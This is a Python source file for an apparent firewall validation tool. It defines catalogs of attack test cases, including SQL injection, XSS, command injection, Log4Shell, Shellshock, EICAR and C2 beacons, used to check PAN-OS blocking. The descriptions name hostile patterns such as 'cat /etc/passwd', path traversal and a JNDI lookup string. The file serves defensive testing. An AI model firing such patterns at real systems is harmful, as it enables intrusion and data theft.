"""Security Testing Engine — validates PAN-OS NGFW security profiles.

Runs known attack patterns through the firewall and checks whether they are
blocked (PASS) or pass through (FAIL). Covers Vulnerability Protection,
Anti-Virus/Threat Prevention, and URL Filtering.
"""
import io
import json
import logging
import os
import socket
import ssl
import struct
import subprocess
import threading
import time
import uuid
import zipfile
from dataclasses import dataclass, field
from typing import Dict, List, Optional
from urllib.parse import quote

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
log = logging.getLogger('security')

# ─── Data Structures ────────────────────────────────────────

@dataclass
class SecurityTestCase:
    id: str
    name: str
    category: str           # web_attacks | malware_threats | url_filtering
    description: str
    expected_action: str    # "block"
    panos_feature: str      # PAN-OS feature that should catch this
    threat_id: str = ''     # PAN-OS Threat ID (e.g., "41000 — SQL Injection")
    # Custom pattern fields
    custom: bool = False
    payload: str = ''
    method: str = 'GET'
    headers: dict = field(default_factory=dict)
    target_path: str = '/echo'

@dataclass
class SecurityTestResult:
    test_id: str
    test_name: str
    category: str
    expected_action: str
    actual_result: str      # blocked | passed_through | error | pending
    verdict: str            # PASS | FAIL | ERROR
    response_code: int
    detail: str
    panos_feature: str
    threat_id: str = ''
    timestamp: float = 0.0
    # Enriched fields
    description: str = ''
    payload: str = ''
    url: str = ''
    method: str = ''
    expected_behavior: str = ''
    response_body_snippet: str = ''
    response_headers: dict = field(default_factory=dict)
    verdict_explanation: str = ''

# ─── Expected Behavior Map ──────────────────────────────────

EXPECTED_BEHAVIOR = {
    'sqli_union': 'Firewall Vulnerability Protection profile should detect UNION SELECT pattern in the HTTP request and reset/block the connection',
    'sqli_or': 'Firewall should detect OR-based SQL injection bypass pattern and block the request',
    'sqli_drop': 'Firewall should detect destructive DROP TABLE SQL statement and block the request',
    'xss_script': 'Firewall should detect <script> tag in URL parameter and block reflected XSS attempt',
    'xss_img': 'Firewall should detect IMG tag with onerror JavaScript handler and block the XSS payload',
    'xss_svg': 'Firewall should detect SVG element with onload handler and block the XSS payload',
    'cmdi_cat': 'Firewall should detect OS command injection pattern (semicolon + system command) and block',
    'cmdi_pipe': 'Firewall should detect pipe-based command injection and block the request',
    'cmdi_backtick': 'Firewall should detect backtick command execution and block the request',
    'path_traversal': 'Firewall should detect directory traversal sequences (../../) targeting sensitive files',
    'log4shell': 'Firewall should detect JNDI lookup string ${jndi:ldap://...} in HTTP headers (CVE-2021-44228)',
    'eicar_http': 'Firewall Anti-Virus profile should detect EICAR test file signature in HTTP response and block the download',
    'eicar_https': 'Firewall must have SSL Decryption enabled to inspect HTTPS payload. Anti-Virus should detect EICAR in decrypted stream',
    'eicar_zip': 'Firewall Anti-Virus should detect EICAR inside ZIP archive (requires archive inspection enabled)',
    'c2_callback': 'Firewall Anti-Spyware profile should detect C2 beacon callback pattern (base64 payload + suspicious headers)',
    'malicious_ua': 'Firewall Anti-Spyware should detect known malware User-Agent string (CobaltStrike)',
    'url_malware': 'Firewall URL Filtering profile should block access to URLs categorized as malware in PAN-DB',
    'url_phishing': 'Firewall URL Filtering should block URLs categorized as phishing in PAN-DB',
    'url_hacking': 'Firewall URL Filtering should block URLs categorized as hacking in PAN-DB',
    'url_proxy': 'Firewall URL Filtering should block URLs categorized as proxy-avoidance/anonymizers in PAN-DB',
    # DNS Attacks
    'dns_tunnel': 'Firewall Anti-Spyware profile should detect anomalous DNS queries with long, encoded subdomain labels indicative of DNS tunneling (iodine, dnscat2)',
    'dns_dga': 'Firewall Anti-Spyware should detect high-entropy, algorithmically-generated domain names characteristic of DGA-based botnet C2 communication',
    'dns_rebind': 'Firewall should detect DNS rebinding patterns where domains resolve to private IP ranges, potentially bypassing same-origin policy',
    # Protocol Abuse
    'ssh_bruteforce': 'Firewall Vulnerability Protection / Zone Protection should detect rapid SSH login failures and trigger brute-force protection signatures',
    'ftp_bounce': 'Firewall should detect FTP PORT commands targeting internal IP addresses, a technique used for network reconnaissance (FTP bounce scan)',
    'http_smuggle': 'Firewall should detect ambiguous Content-Length / Transfer-Encoding headers used in HTTP request smuggling attacks',
    'slowloris': 'Firewall or Zone Protection profile should detect slow-rate DoS patterns (Slowloris) where connections send partial headers to exhaust server resources',
    # File-Based Threats
    'pdf_js': 'Firewall Anti-Virus or File Blocking profile should detect and block PDF files containing embedded JavaScript, commonly used for exploitation',
    'office_macro': 'Firewall Anti-Virus or File Blocking should detect OLE2 documents with VBA macros (AutoOpen), a primary malware delivery vector',
    'pe_download': 'Firewall File Blocking or Anti-Virus profile should detect PE executable (MZ/PE header) downloads over HTTP and block based on file type policy',
    # Advanced Web Attacks
    'xxe': 'Firewall Vulnerability Protection should detect XML External Entity (XXE) patterns including DOCTYPE and ENTITY declarations targeting file:// or other URI schemes',
    'ssrf': 'Firewall should detect Server-Side Request Forgery (SSRF) attempts targeting internal IPs, cloud metadata endpoints (169.254.169.254), or private network ranges',
    'ssti': 'Firewall should detect Server-Side Template Injection patterns ({{...}}, ${...}) that attempt to execute code through template engines like Jinja2 or Freemarker',
    'ldap_injection': 'Firewall should detect LDAP injection metacharacters and filter manipulation patterns that attempt to bypass LDAP-based authentication or query data',
    'xpath_injection': 'Firewall should detect XPath injection patterns that attempt to manipulate XML queries for authentication bypass or data extraction',
    'crlf_injection': 'Firewall should detect CRLF injection (%0d%0a) in HTTP headers that attempt to inject arbitrary headers or split HTTP responses for cache poisoning',
    'open_redirect': 'Firewall should detect open redirect patterns where user-supplied URLs redirect to external malicious domains, commonly used in phishing attacks',
    'blind_sqli': 'Firewall Vulnerability Protection should detect time-based blind SQL injection patterns like WAITFOR DELAY, SLEEP(), and BENCHMARK() used for data exfiltration',
    'deserialization': 'Firewall should detect serialized object payloads (Java rO0AB, .NET AAEAAAD, PHP a:) that could lead to remote code execution via insecure deserialization',
    'shellshock': 'Firewall Vulnerability Protection should detect Shellshock (CVE-2014-6271) pattern "() { :;}" in HTTP headers targeting Bash CGI handlers',
    'file_inclusion': 'Firewall should detect Remote File Inclusion (RFI) patterns with URL parameters pointing to external files (http://, ftp://) for remote code execution',
    'info_disclosure': 'Firewall should detect access attempts to common information disclosure paths (phpinfo.php, .env, .git/) that expose sensitive server configuration',
    # SSL Decryption Validation
    'ssl_sqli': 'Firewall SSL Decryption policy must decrypt this HTTPS session. Vulnerability Protection should then detect SQL injection in the decrypted payload. If this test FAILs, verify Decryption Policy and Decryption Profile are configured and applied to the security rule',
    'ssl_xss': 'Firewall SSL Decryption must decrypt HTTPS traffic. Vulnerability Protection should detect XSS <script> tag in the decrypted request. FAIL indicates decryption is not active or profile is not attached',
    'ssl_eicar': 'Firewall SSL Decryption must decrypt the HTTPS download. Anti-Virus should detect the EICAR test file in the decrypted stream. This is the definitive test for SSL decryption — if EICAR passes through HTTPS, decryption is not working',
    'ssl_c2': 'Firewall SSL Decryption must decrypt HTTPS. Anti-Spyware should detect the C2 beacon callback pattern in the decrypted payload. FAIL means either decryption or Anti-Spyware profile is not active',
    'ssl_cmdi': 'Firewall SSL Decryption must decrypt HTTPS. Vulnerability Protection should detect OS command injection in the decrypted request parameters',
    # App-ID Validation
    'appid_ssh_on_443': 'Firewall App-ID should identify SSH protocol on port 443 (normally HTTPS). If a policy blocks SSH regardless of port, the connection should be reset. PASS confirms App-ID identifies applications by behavior, not port',
    'appid_http_on_8080': 'Firewall App-ID should identify HTTP (web-browsing) on a non-standard port. If policies allow web-browsing, the connection succeeds and App-ID correctly identified the application',
    'appid_ftp_on_443': 'Firewall App-ID should identify FTP protocol on port 443. If a policy blocks FTP, the connection should be reset regardless of port. PASS confirms port-independent application identification',
    'appid_dns_on_80': 'Firewall App-ID should identify DNS protocol sent over TCP port 80. If policies restrict DNS to port 53, the connection should be blocked. PASS confirms App-ID detects DNS regardless of port',
    # Data Exfiltration / DLP
    'exfil_credit_card': 'Firewall Data Filtering profile should detect credit card number patterns (Luhn-valid numbers) in the HTTP POST body and block the exfiltration attempt',
    'exfil_ssn': 'Firewall Data Filtering profile should detect Social Security Number patterns (XXX-XX-XXXX) in the HTTP POST body and block the data exfiltration',
    'exfil_bulk_data': 'Firewall Data Filtering profile should detect bulk PII data (mixed credit cards, SSNs, emails) in the HTTP POST body and block the exfiltration',
    'exfil_dns_data': 'Firewall Anti-Spyware profile should detect data exfiltration via DNS subdomain encoding — hex-encoded data embedded in DNS query labels',
    'exfil_http_headers': 'Firewall Data Filtering profile should detect sensitive data patterns (credit cards, SSNs) hidden in custom HTTP headers',
    # Evasion Techniques
    'evasion_double_encode': 'Firewall should normalize double-URL-encoded payloads (%2527 → %27 → \') and detect the underlying SQL injection. Requires URL decode normalization in Vulnerability Protection profile',
    'evasion_null_byte': 'Firewall should detect path traversal even with null byte injection (%00) used to bypass file extension checks. Requires proper null byte handling in the IPS engine',
    'evasion_chunked': 'Firewall should reassemble chunked Transfer-Encoding and detect SQL injection split across HTTP chunks. Requires HTTP protocol decoder to reassemble before signature matching',
    'evasion_unicode': 'Firewall should decode Unicode escape sequences (\\u003c = <) and detect the underlying XSS attack. Requires Unicode normalization in the IPS engine',
    'evasion_case_mixing': 'Firewall should perform case-insensitive matching and detect SQL injection keywords regardless of character case (SeLeCt, UnIoN). Standard IPS behavior',
    'evasion_comment_insert': 'Firewall should detect SQL injection even with comment insertion (UN/**/ION) used to evade simple pattern matching. Requires SQL syntax-aware inspection',
    # Expanded C2
    'c2_cobalt_strike': 'Firewall Anti-Spyware profile should detect Cobalt Strike malleable C2 beacon patterns including characteristic URI paths, MSIE User-Agent, and encoded session cookies',
    'c2_metasploit': 'Firewall Anti-Spyware should detect Metasploit reverse HTTP handler patterns including Trident User-Agent, short URI paths, and binary POST payloads',
    'c2_dns_c2': 'Firewall Anti-Spyware should detect C2 communication over DNS TXT queries with encoded data in subdomain labels, characteristic of tools like dnscat2 and Cobalt Strike DNS beacon',
    'c2_icmp_tunnel': 'Firewall Anti-Spyware or Zone Protection should detect data exfiltration over ICMP echo requests with oversized or encoded payloads, characteristic of tools like icmpsh and ptunnel',
    'c2_http_beacon': 'Firewall Anti-Spyware should detect periodic HTTP beacon patterns with rotating User-Agents, encoded payloads, and consistent callback intervals characteristic of C2 frameworks',
    # Credential Phishing
    'phish_http_login': 'Firewall Credential Phishing Prevention should detect corporate credential submission to an untrusted HTTP login form and block the POST request',
    'phish_https_login': 'Firewall Credential Phishing Prevention (with SSL Decryption) should detect credential submission over HTTPS to an untrusted login form',
    'phish_js_exfil': 'Firewall URL Filtering or Credential Phishing Prevention should detect credentials being exfiltrated via URL query parameters (simulating JavaScript keylogger)',
    'phish_hidden_form': 'Firewall Credential Phishing Prevention should detect credential harvesting via hidden form fields with redirect to external collection domain',
    # Encrypted DNS
    'doh_google': 'Firewall App-ID should identify and block DNS-over-HTTPS (DoH) traffic to Google DNS (dns.google), preventing encrypted DNS bypass of DNS Security policies',
    'doh_cloudflare': 'Firewall App-ID should identify and block DNS-over-HTTPS (DoH) traffic to Cloudflare DNS (cloudflare-dns.com), preventing DNS policy bypass',
    'doh_exfil': 'Firewall should detect data exfiltration via DNS-over-HTTPS — hex-encoded data sent as subdomains in DoH queries bypassing standard DNS inspection',
    'dot_query': 'Firewall App-ID should identify and block DNS-over-TLS (DoT) traffic, preventing encrypted DNS from bypassing DNS Security and logging policies',
    # Spyware Phone-Home
    'spy_gh0st': 'Firewall Anti-Spyware profile should detect Gh0st RAT callback pattern — characteristic User-Agent string and magic bytes used by the Gh0st remote access trojan family',
    'spy_njrat': 'Firewall Anti-Spyware profile should detect njRAT phone-home pattern — characteristic User-Agent and connection string used by njRAT/Bladabindi trojan',
    'spy_darkcomet': 'Firewall Anti-Spyware profile should detect DarkComet RAT beacon — characteristic pipe-delimited data format (DCDATA|) used for C2 communication',
    'spy_emotet': 'Firewall Anti-Spyware profile should detect Emotet trojan check-in — characteristic POST body with binary-like encoded payload and MSIE User-Agent pattern',
    # CVE Exploits
    'cve_spring4shell': 'Firewall Vulnerability Protection should detect Spring4Shell (CVE-2022-22965) exploit pattern — class.module.classLoader property access chain for RCE via Spring Framework',
    'cve_apache_struts': 'Firewall Vulnerability Protection should detect Apache Struts RCE (CVE-2017-5638) — OGNL expression injection via Content-Type header for remote code execution',
    'cve_proxyshell': 'Firewall Vulnerability Protection should detect ProxyShell (CVE-2021-34473) — Exchange Server autodiscover path traversal with email address prefix for SSRF',
    'cve_moveit': 'Firewall Vulnerability Protection should detect MOVEit Transfer SQLi (CVE-2023-34362) — SQL injection via X-siLock-Transaction header targeting MOVEit database',
    'cve_confluence': 'Firewall Vulnerability Protection should detect Confluence OGNL injection (CVE-2022-26134) — OGNL expression in URI for unauthenticated remote code execution',
    # Brute Force
    'bf_http_login': 'Firewall Vulnerability Protection or Zone Protection should detect rapid HTTP login attempts (10 sequential failures) and trigger brute-force protection to rate-limit or block',
    'bf_basic_auth': 'Firewall should detect rapid HTTP Basic Authentication failures indicating credential brute-force attack and block after threshold exceeded',
    'bf_password_spray': 'Firewall should detect password spray pattern — same password tested against multiple usernames in rapid succession, a common credential attack technique',
    # File Blocking
    'fb_bat': 'Firewall File Blocking profile should detect and block BAT script file downloads based on file type (application/x-msdos-program) — tests file-type-based blocking policy',
    'fb_ps1': 'Firewall File Blocking profile should detect and block PowerShell script (.ps1) downloads — a common malware delivery mechanism that should be blocked by file type policy',
    'fb_hta': 'Firewall File Blocking profile should detect and block HTA (HTML Application) file downloads — HTA files can execute code with full system access and are a known malware vector',
    'fb_jar': 'Firewall File Blocking profile should detect and block Java Archive (.jar) file downloads based on file type — JAR files are a common exploit delivery mechanism',
    # WildFire Analysis
    'wf_novel_pe': 'Firewall WildFire profile should submit this novel PE executable (with suspicious API imports like VirtualAllocEx, CreateRemoteThread) to the WildFire sandbox for analysis',
    'wf_macro_dropper': 'Firewall WildFire profile should detect this macro document with embedded PowerShell download cradle and submit for sandbox analysis or block as suspicious',
    'wf_script_obfuscated': 'Firewall WildFire or Anti-Virus profile should detect obfuscated VBScript using Chr() concatenation — a common technique to evade static signature detection',
    # Cryptomining
    'crypto_coinhive': 'Firewall Anti-Spyware profile should detect Coinhive cryptocurrency mining script pattern — characteristic WebSocket upgrade with coinhive protocol and mining script URI',
    'crypto_stratum': 'Firewall Anti-Spyware profile should detect Stratum mining protocol — JSON-RPC mining.subscribe method with miner identification (XMRig) used for crypto pool communication',
    'crypto_pool_url': 'Firewall URL Filtering or Anti-Spyware should detect and block access to known cryptocurrency mining pool domains (minergate.com, pool addresses)',
    # Ransomware
    'ransom_note': 'Firewall Anti-Spyware or Data Filtering should detect ransomware note content — Bitcoin wallet addresses, payment demands, and file encryption notifications are characteristic patterns',
    'ransom_c2_tor': 'Firewall Anti-Spyware or URL Filtering should detect ransomware Tor C2 communication — .onion domain in Host header with TOR User-Agent indicates ransomware phoning home',
    'ransom_wannacry': 'Firewall Anti-Spyware should detect WannaCry ransomware kill-switch domain access pattern — the characteristic long random domain used by WannaCry for activation check',
}

# ─── Test Catalog ───────────────────────────────────────────

WEB_ATTACK_TESTS = [
    SecurityTestCase('sqli_union', 'SQL Injection — UNION SELECT',
        'web_attacks', 'UNION-based SQL injection in URL query parameter. Sends a crafted SQL UNION SELECT statement that attempts to extract usernames and passwords from the database. This is one of the most common SQL injection techniques used to exfiltrate data.',
        'block', 'Vulnerability Protection', threat_id='41000 — SQL Injection: UNION SELECT'),
    SecurityTestCase('sqli_or', 'SQL Injection — OR 1=1',
        'web_attacks', 'Boolean-based SQL injection via OR clause. Injects an always-true condition (OR 1=1) to bypass authentication or retrieve all records from a database table.',
        'block', 'Vulnerability Protection', threat_id='41001 — SQL Injection: Boolean-Based'),
    SecurityTestCase('sqli_drop', 'SQL Injection — DROP TABLE',
        'web_attacks', 'Destructive SQL injection with DROP TABLE statement. Attempts to delete an entire database table, causing data loss and service disruption.',
        'block', 'Vulnerability Protection', threat_id='41002 — SQL Injection: DROP Statement'),
    SecurityTestCase('xss_script', 'XSS — Script Tag',
        'web_attacks', 'Reflected XSS via <script> tag in URL parameter. Injects JavaScript code that executes in the victim\'s browser when the server reflects the payload back in the response.',
        'block', 'Vulnerability Protection', threat_id='41501 — Cross-Site Scripting: Script Tag'),
    SecurityTestCase('xss_img', 'XSS — IMG onerror',
        'web_attacks', 'Reflected XSS via IMG tag with onerror handler. Uses a broken image tag to trigger JavaScript execution through the onerror event handler, bypassing basic script tag filters.',
        'block', 'Vulnerability Protection', threat_id='41502 — Cross-Site Scripting: Event Handler'),
    SecurityTestCase('xss_svg', 'XSS — SVG onload',
        'web_attacks', 'Reflected XSS via SVG element with onload handler. Exploits SVG\'s onload event to execute JavaScript, a technique often used to bypass XSS filters.',
        'block', 'Vulnerability Protection', threat_id='41503 — Cross-Site Scripting: SVG Element'),
    SecurityTestCase('cmdi_cat', 'Command Injection — cat /etc/passwd',
        'web_attacks', 'OS command injection reading sensitive file. Appends a semicolon and system command to read /etc/passwd, attempting to extract user account information from the server.',
        'block', 'Vulnerability Protection', threat_id='42001 — OS Command Injection'),
    SecurityTestCase('cmdi_pipe', 'Command Injection — Pipe',
        'web_attacks', 'OS command injection using pipe operator. Uses the pipe (|) to chain a directory listing command, attempting to enumerate the server\'s file system.',
        'block', 'Vulnerability Protection', threat_id='42001 — OS Command Injection'),
    SecurityTestCase('cmdi_backtick', 'Command Injection — Backtick',
        'web_attacks', 'OS command injection via backtick execution. Uses backtick syntax to execute the id command, revealing the server process\'s user identity and privileges.',
        'block', 'Vulnerability Protection', threat_id='42001 — OS Command Injection'),
    SecurityTestCase('path_traversal', 'Path Traversal — ../../etc/passwd',
        'web_attacks', 'Directory traversal to read /etc/passwd. Uses relative path sequences (../) to escape the web root and access sensitive system files.',
        'block', 'Vulnerability Protection', threat_id='42501 — Directory Traversal'),
    SecurityTestCase('log4shell', 'Log4Shell — JNDI Lookup',
        'web_attacks', 'Log4j RCE via JNDI lookup string in HTTP header (CVE-2021-44228). Sends the ${jndi:ldap://...} payload in HTTP headers, exploiting the Log4j vulnerability to trigger remote code execution.',
        'block', 'Vulnerability Protection', threat_id='93054 — Apache Log4j RCE (CVE-2021-44228)'),
    SecurityTestCase('xxe', 'XXE — XML External Entity',
        'web_attacks', 'XML External Entity injection. Sends a crafted XML payload with a DOCTYPE declaration referencing an external entity (/etc/passwd), attempting server-side file disclosure.',
        'block', 'Vulnerability Protection', threat_id='43001 — XML External Entity Injection'),
    SecurityTestCase('ssrf', 'SSRF — Server-Side Request Forgery',
        'web_attacks', 'Sends a request with a URL parameter pointing to an internal metadata endpoint (169.254.169.254), attempting to access cloud instance metadata or internal services.',
        'block', 'Vulnerability Protection', threat_id='43501 — Server-Side Request Forgery'),
    SecurityTestCase('ssti', 'SSTI — Server-Side Template Injection',
        'web_attacks', 'Sends template expression payloads ({{7*7}}, ${7*7}) that execute on the server if improperly sandboxed. Tests detection of Jinja2/Twig/Freemarker injection patterns.',
        'block', 'Vulnerability Protection', threat_id='44001 — Server-Side Template Injection'),
    SecurityTestCase('ldap_injection', 'LDAP Injection',
        'web_attacks', 'Injects LDAP filter metacharacters to modify directory queries. Sends payload with wildcard and boolean operators to extract or bypass LDAP authentication.',
        'block', 'Vulnerability Protection', threat_id='44501 — LDAP Injection'),
    SecurityTestCase('xpath_injection', 'XPath Injection',
        'web_attacks', 'Injects XPath query syntax to manipulate XML data queries. Sends boolean-based XPath injection to bypass authentication or extract XML document data.',
        'block', 'Vulnerability Protection', threat_id='44502 — XPath Injection'),
    SecurityTestCase('crlf_injection', 'CRLF / Header Injection',
        'web_attacks', 'Injects carriage return and line feed characters (%0d%0a) into HTTP headers to add arbitrary headers or split the response, enabling cache poisoning or XSS.',
        'block', 'Vulnerability Protection', threat_id='45001 — HTTP Header Injection'),
    SecurityTestCase('open_redirect', 'Open Redirect',
        'web_attacks', 'Sends a request with a redirect parameter pointing to an external malicious site. Firewalls should detect URL redirect manipulation patterns.',
        'block', 'Vulnerability Protection', threat_id='45501 — Open Redirect'),
    SecurityTestCase('blind_sqli', 'Blind SQL Injection — Time-Based',
        'web_attacks', 'Sends a time-based blind SQL injection payload using WAITFOR DELAY or SLEEP() to detect SQL injection vulnerabilities without direct output.',
        'block', 'Vulnerability Protection', threat_id='41003 — SQL Injection: Time-Based Blind'),
    SecurityTestCase('deserialization', 'Insecure Deserialization',
        'web_attacks', 'Sends a serialized Java object payload (rO0AB...) in the request body, targeting insecure deserialization vulnerabilities in Java-based applications.',
        'block', 'Vulnerability Protection', threat_id='46001 — Java Deserialization Attack'),
    SecurityTestCase('shellshock', 'Shellshock — CVE-2014-6271',
        'web_attacks', 'Sends the Shellshock (Bash bug) exploit payload in HTTP headers. The () { :;} pattern exploits CVE-2014-6271 to achieve remote code execution on vulnerable CGI servers.',
        'block', 'Vulnerability Protection', threat_id='36729 — Shellshock Bash RCE (CVE-2014-6271)'),
    SecurityTestCase('file_inclusion', 'Remote File Inclusion (RFI)',
        'web_attacks', 'Sends a URL parameter referencing a remote PHP file for inclusion. If the server processes this, it could execute arbitrary remote code.',
        'block', 'Vulnerability Protection', threat_id='46501 — Remote File Inclusion'),
    SecurityTestCase('info_disclosure', 'Information Disclosure — phpinfo',
        'web_attacks', 'Attempts to access common information disclosure paths (phpinfo.php, .env, .git/config) that expose sensitive server configuration and credentials.',
        'block', 'Vulnerability Protection', threat_id='47001 — Information Disclosure'),
]

MALWARE_TESTS = [
    SecurityTestCase('eicar_http', 'EICAR Download — HTTP',
        'malware_threats', 'Download EICAR anti-malware test file over HTTP (port 9999). The EICAR test string is a standardized 68-byte file recognized by all anti-virus products as a test threat. Downloaded over unencrypted HTTP for easy inspection.',
        'block', 'Anti-Virus', threat_id='275470248 — EICAR Test File'),
    SecurityTestCase('eicar_https', 'EICAR Download — HTTPS',
        'malware_threats', 'Download EICAR test file over HTTPS (port 443). Same EICAR file but over encrypted HTTPS. Firewall must have SSL Decryption policy enabled to inspect the encrypted payload and detect the threat.',
        'block', 'Anti-Virus', threat_id='275470248 — EICAR Test File (SSL)'),
    SecurityTestCase('eicar_zip', 'EICAR in ZIP — HTTP',
        'malware_threats', 'Download EICAR inside ZIP archive over HTTP. Tests whether the firewall can inspect compressed archives and detect threats inside ZIP files. Requires archive inspection to be enabled in the Anti-Virus profile.',
        'block', 'Anti-Virus', threat_id='275470248 — EICAR Test File (Archive)'),
    SecurityTestCase('c2_callback', 'C2 Callback Pattern',
        'malware_threats', 'HTTP POST with encoded data mimicking C2 beacon callback. Sends a base64-encoded payload with suspicious headers (old IE User-Agent, hex session cookie, suspicious X-Request-ID) that mimic command-and-control beacon traffic.',
        'block', 'Anti-Spyware', threat_id='86500 — C2 Beacon Callback'),
    SecurityTestCase('malicious_ua', 'Malicious User-Agent',
        'malware_threats', 'HTTP request with known malware User-Agent string. Sends a request with "Wget/1.0 (CobaltStrike)" User-Agent, mimicking traffic from a well-known penetration testing/attack framework.',
        'block', 'Anti-Spyware', threat_id='86501 — Suspicious User-Agent String'),
]

URL_FILTERING_TESTS = [
    SecurityTestCase('url_malware', 'URL Category — Malware',
        'url_filtering', 'Access URL in PAN-DB malware category. Attempts to visit a URL that PAN-DB classifies as hosting malware. URL Filtering policy should block access to this category.',
        'block', 'URL Filtering', threat_id='PAN-DB: malware'),
    SecurityTestCase('url_phishing', 'URL Category — Phishing',
        'url_filtering', 'Access URL in PAN-DB phishing category. Attempts to visit a URL classified as a phishing site. URL Filtering should block access to prevent credential theft.',
        'block', 'URL Filtering', threat_id='PAN-DB: phishing'),
    SecurityTestCase('url_hacking', 'URL Category — Hacking',
        'url_filtering', 'Access URL in PAN-DB hacking category. Attempts to visit a URL categorized as hacking/computer security tools. URL Filtering should block based on policy.',
        'block', 'URL Filtering', threat_id='PAN-DB: hacking'),
    SecurityTestCase('url_proxy', 'URL Category — Proxy/Anonymizer',
        'url_filtering', 'Access URL in PAN-DB proxy-avoidance category. Attempts to visit a proxy/anonymizer site used to bypass security controls. URL Filtering should block to prevent policy evasion.',
        'block', 'URL Filtering', threat_id='PAN-DB: proxy-avoidance'),
]

DNS_ATTACK_TESTS = [
    SecurityTestCase('dns_tunnel', 'DNS Tunneling Detection',
        'dns_attacks', 'Sends DNS queries with suspiciously long subdomain labels containing base64-encoded data, mimicking DNS tunneling tools like iodine or dnscat2. The firewall Anti-Spyware profile should detect anomalous DNS query patterns.',
        'block', 'Anti-Spyware', threat_id='86600 — Suspicious DNS Query (Tunneling)'),
    SecurityTestCase('dns_dga', 'DGA Domain Detection',
        'dns_attacks', 'Queries multiple algorithmically-generated domain names that mimic Domain Generation Algorithm (DGA) patterns used by malware botnets. The firewall should detect the entropy and pattern of DGA domains.',
        'block', 'Anti-Spyware', threat_id='86601 — DGA Domain Query'),
    SecurityTestCase('dns_rebind', 'DNS Rebinding Attempt',
        'dns_attacks', 'Queries domains that could be used in DNS rebinding attacks, where a domain alternates between external and private IP addresses to bypass same-origin policy and access internal resources.',
        'block', 'Anti-Spyware', threat_id='86602 — DNS Rebinding Attempt'),
]

PROTOCOL_ABUSE_TESTS = [
    SecurityTestCase('ssh_bruteforce', 'SSH Brute Force Pattern',
        'protocol_abuse', 'Performs rapid successive SSH login attempts with different credentials, simulating a brute-force attack. The firewall should detect the high rate of failed authentication attempts and trigger a brute-force protection signature.',
        'block', 'Vulnerability Protection', threat_id='40015 — SSH Brute Force'),
    SecurityTestCase('ftp_bounce', 'FTP Bounce Scan',
        'protocol_abuse', 'Attempts to use FTP PORT command to redirect data connections to internal IP addresses, simulating an FTP bounce scan used for internal network reconnaissance.',
        'block', 'Vulnerability Protection', threat_id='30003 — FTP Bounce Scan'),
    SecurityTestCase('http_smuggle', 'HTTP Request Smuggling',
        'protocol_abuse', 'Sends an HTTP request with ambiguous Content-Length and Transfer-Encoding headers to exploit parsing differences between firewall and server, potentially smuggling malicious requests.',
        'block', 'Vulnerability Protection', threat_id='41600 — HTTP Request Smuggling'),
    SecurityTestCase('slowloris', 'Slowloris DoS Pattern',
        'protocol_abuse', 'Opens an HTTP connection and sends partial headers very slowly, keeping the connection alive without completing the request. This Slowloris-style pattern should be detected by the firewall as a denial-of-service attempt.',
        'block', 'Vulnerability Protection', threat_id='40039 — Slowloris DoS Attack'),
]

FILE_THREAT_TESTS = [
    SecurityTestCase('pdf_js', 'PDF with Embedded JavaScript',
        'file_threats', 'Downloads a PDF file containing embedded JavaScript (app.alert action). The firewall Anti-Virus or file blocking profile should detect and block PDFs with active content as they are commonly used for exploitation.',
        'block', 'Anti-Virus', threat_id='52001 — PDF with JavaScript'),
    SecurityTestCase('office_macro', 'Office Document with VBA Macro',
        'file_threats', 'Downloads a file with OLE2 compound document header and VBA macro signatures (AutoOpen). The firewall should detect and block files containing macro code, as they are a primary vector for malware delivery.',
        'block', 'Anti-Virus', threat_id='52002 — Office Macro Document'),
    SecurityTestCase('pe_download', 'PE Executable Download — HTTP',
        'file_threats', 'Downloads a Windows PE executable file (MZ/PE header) over HTTP. The firewall file blocking or Anti-Virus profile should detect the executable file type and block the download based on policy.',
        'block', 'Anti-Virus', threat_id='File Blocking: PE executable'),
]

SSL_DECRYPTION_TESTS = [
    SecurityTestCase('ssl_sqli', 'SQL Injection over HTTPS',
        'ssl_decryption', 'Sends SQL injection payload over HTTPS. If the firewall is decrypting SSL, Vulnerability Protection will detect and block the attack in the decrypted stream. If this passes through, SSL decryption is likely not enabled.',
        'block', 'SSL Decryption + Vulnerability Protection', threat_id='41000 — SQL Injection (SSL)'),
    SecurityTestCase('ssl_xss', 'XSS over HTTPS',
        'ssl_decryption', 'Sends Cross-Site Scripting payload over HTTPS. Requires SSL decryption to inspect the encrypted payload and detect the <script> tag.',
        'block', 'SSL Decryption + Vulnerability Protection', threat_id='41501 — Cross-Site Scripting (SSL)'),
    SecurityTestCase('ssl_eicar', 'EICAR Download over HTTPS',
        'ssl_decryption', 'Downloads the EICAR anti-malware test file over HTTPS. This is the definitive SSL decryption test — the firewall must decrypt the HTTPS session to detect the EICAR signature in the response body.',
        'block', 'SSL Decryption + Anti-Virus', threat_id='275470248 — EICAR Test File (SSL Decryption)'),
    SecurityTestCase('ssl_c2', 'C2 Callback over HTTPS',
        'ssl_decryption', 'Sends C2 beacon callback pattern over HTTPS with base64-encoded payload and suspicious headers. Anti-Spyware must inspect the decrypted stream to detect the C2 pattern.',
        'block', 'SSL Decryption + Anti-Spyware', threat_id='86500 — C2 Beacon (SSL)'),
    SecurityTestCase('ssl_cmdi', 'Command Injection over HTTPS',
        'ssl_decryption', 'Sends OS command injection payload over HTTPS. Vulnerability Protection must inspect the decrypted request to detect the injection pattern.',
        'block', 'SSL Decryption + Vulnerability Protection', threat_id='42001 — OS Command Injection (SSL)'),
]

APPID_VALIDATION_TESTS = [
    SecurityTestCase('appid_ssh_on_443', 'SSH Traffic on HTTPS Port (443)',
        'appid_validation', 'Sends SSH protocol banner on port 443 (normally HTTPS). Firewall App-ID should identify the traffic as SSH regardless of port and enforce application-based policy.',
        'block', 'App-ID', threat_id='App-ID: SSH on port 443'),
    SecurityTestCase('appid_http_on_8080', 'HTTP on Non-Standard Port (8082)',
        'appid_validation', 'Sends standard HTTP request on port 8082. Firewall App-ID should identify it as web-browsing regardless of port number.',
        'block', 'App-ID', threat_id='App-ID: web-browsing'),
    SecurityTestCase('appid_ftp_on_443', 'FTP Traffic on HTTPS Port (443)',
        'appid_validation', 'Sends FTP protocol commands on port 443. Firewall App-ID should identify the traffic as FTP, not HTTPS, and enforce FTP-specific policies.',
        'block', 'App-ID', threat_id='App-ID: FTP on port 443'),
    SecurityTestCase('appid_dns_on_80', 'DNS Query on HTTP Port (80)',
        'appid_validation', 'Sends a DNS A query over TCP port 80. Firewall App-ID should identify the traffic as DNS protocol regardless of the port and apply DNS-specific policies.',
        'block', 'App-ID', threat_id='App-ID: DNS on port 80'),
]

